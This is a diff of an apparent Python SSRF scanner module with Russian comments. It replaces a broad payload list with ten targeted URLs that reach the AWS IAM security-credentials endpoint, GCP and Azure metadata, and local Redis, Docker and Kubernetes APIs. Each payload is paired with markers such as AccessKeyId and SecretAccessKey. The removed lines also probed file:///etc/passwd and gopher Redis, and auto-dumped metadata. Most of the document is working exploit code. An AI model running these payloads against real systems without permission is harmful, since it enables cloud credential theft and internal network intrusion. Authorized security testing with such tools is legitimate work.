@@ -1,75 +1,89 @@
-"""ssrf — SSRF scanner on Probe v2 with verify + auto-dump"""
+"""ssrf v7 — sniper + baseline gate: markers must be NEW (not in original page)"""
+import time
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-from core.probe import Probe
-from core.payload_source import get_payloads
+from core.http import HttpClient
 
-PAYLOADS = get_payloads('ssrf', limit=20) + [
-    "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
-    "http://0x7f000001/", "http://0177.0.0.1/", "http://2130706433/",
-    "http://169.254.169.254/latest/meta-data/",
-    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-    "http://169.254.169.254/latest/user-data",
-    "http://metadata.google.internal/computeMetadata/v1/",
-    "http://100.100.100.200/latest/meta-data/",
-    "file:///etc/passwd", "file:///c:/windows/win.ini",
-    "gopher://127.0.0.1:6379/_INFO",
-    "dict://127.0.0.1:6379/info",
-    "http://127.0.0.1:6379/", "http://127.0.0.1:11211/",
-    "http://127.0.0.1:9200/", "http://127.0.0.1:2375/version",
-]
 
-MARKERS = [
-    "ami-id", "instance-id", "security-credentials", "computeMetadata", "vmId",
-    "root:x:0:0", "redis_version", "elasticsearch", "memcached",
-    "project-id", "service-accounts",
-    "AccessKeyId", "SecretAccessKey",
-]
+# 10 целевых URL (не 85)
+TARGETED = {
+    "aws_metadata":     ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"]),
+    "aws_creds":        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
+    "gcp_metadata":     ("http://metadata.google.internal/computeMetadata/v1/", ["project-id", "service-accounts"]),
+    "azure_metadata":   ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["vmId", "subscriptionId"]),
+    "localhost_80":     ("http://127.0.0.1:80/", ["localhost", "127.0.0.1", "nginx", "apache"]),
+    "localhost_8080":   ("http://127.0.0.1:8080/", ["tomcat", "jenkins", "manager"]),
+    "redis":            ("http://127.0.0.1:6379/", ["redis_version", "-ERR", "+OK"]),
+    "docker":           ("http://127.0.0.1:2375/version", ["ApiVersion", "Docker"]),
+    "k8s_api":          ("http://127.0.0.1:8080/api/v1/namespaces", ["kube-system", "default"]),
+    "elasticsearch":    ("http://127.0.0.1:9200/", ["cluster_name", "lucene_version"]),
+}
+
 
 class Ssrf:
     def run(self, session, logger):
         target = session.target
         u = urlparse(target)
         params = parse_qs(u.query) or {"url": ["http://example.com"]}
+        http = HttpClient(session, logger)
 
-        probe = Probe(session, logger)
-        base = probe.baseline_probe(target)
-        if not base:
-            print("[ssrf] no baseline"); return {"findings": []}
-        print(f"[ssrf] baseline: {base['code']} {base['len']}b")
-        print(f"[ssrf] {len(PAYLOADS)} payloads on {list(params.keys())}")
+        # === baseline: тот же URL с заведомо битым параметром ===
+        baseline_text = ""
+        try:
+            base_url = self._url(u, params, list(params)[0], "http://omni_baseline_test.local/")
+            base_r = http.get(base_url)
+            if base_r:
+                baseline_text = (base_r.text or "").lower()
+                print(f"[ssrf v7] baseline: {base_r.status_code} {len(baseline_text)}b")
+        except Exception:
+            pass
+
+        print(f"[ssrf v7] sniper mode")
+        print(f"[ssrf v7] {len(TARGETED)} targeted URLs")
+        print(f"[ssrf v7] params: {list(params.keys())}")
+        print()
 
         findings = []
         vuln_param = None
 
         for name in params:
-            for p in PAYLOADS:
-                url_fn = lambda pl, u=u, params=params, name=name: urlunparse(
-                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()}, name: pl}, doseq=True))
-                )
-                r = probe.inject(url_fn, p, detect_markers=MARKERS)
-                if not r["hit"] or not r["reason"].startswith("marker:"):
+            print(f"[param: {name}]")
+            for key, (url_test, markers) in TARGETED.items():
+                url = self._url(u, params, name, url_test)
+                headers = {"Metadata-Flavor": "Google"} if "google" in url_test else {}
+                r = http.get(url, headers=headers)
+                if not r:
                     continue
 
-                verified = probe.verify(url_fn, p, detect_markers=MARKERS, times=2)
-                if not verified:
-                    print(f"  · unverified: {p[:50]}"); continue
+                hit = None
+                r_low = (r.text or "").lower()
+                for m in markers:
+                    ml = m.lower()
+                    if ml not in r_low:
+                        continue
+                    # маркер уже был в baseline — это фон, не сигнал
+                    if baseline_text and ml in baseline_text:
+                        continue
+                    hit = m
+                    break
 
-                marker = r["reason"].split(":", 1)[1]
-                sev = probe.escalate_severity("critical", r,
-                       r.get("response").text if r.get("response") is not None else "")
-                print(f"  ✓ [{sev}] {name}={p[:60]} -> {marker}")
-                findings.append({"param": name, "payload": p, "marker": marker,
-                                 "severity": sev, "verified": True})
-                logger.finding("ssrf", sev, f"{name}={p[:60]} marker={marker}")
-                vuln_param = name
-                break
-            if vuln_param:
-                break
+                if hit:
+                    time.sleep(0.2)
+                    r2 = http.get(url, headers=headers)
+                    r2_low = (r2.text or "").lower() if r2 else ""
+                    if r2 and hit.lower() in r2_low and hit.lower() not in baseline_text:
+                        sev = "critical" if "creds" in key or "metadata" in key else "high"
+                        print(f"  ✓ SSRF [{key}]: {hit}")
+                        findings.append({"param": name, "key": key,
+                                         "url": url_test, "marker": hit,
+                                         "verified": True})
+                        logger.finding(f"ssrf_{key}", sev,
+                                       f"{name}={url_test} marker={hit}")
+                        vuln_param = name
 
-        if vuln_param:
-            print(f"\n[ssrf] vulnerable: {vuln_param} — auto-dump metadata")
-            probe.auto_dump({"kind": "ssrf"}, target, vuln_param)
+        print()
+        print(f"[ssrf v7] findings: {len(findings)}")
+        return {"findings": findings, "param": vuln_param}
 
-        print(f"\n[ssrf] total: {len(findings)} verified")
-        print(f"[ssrf] stats: {probe.summary()}")
-        return {"findings": findings, "param": vuln_param, "stats": probe.summary()}
+    def _url(self, u, params, name, payload):
+        q = dict(params); q[name] = [payload]
+        return urlunparse(u._replace(query=urlencode(q, doseq=True)))
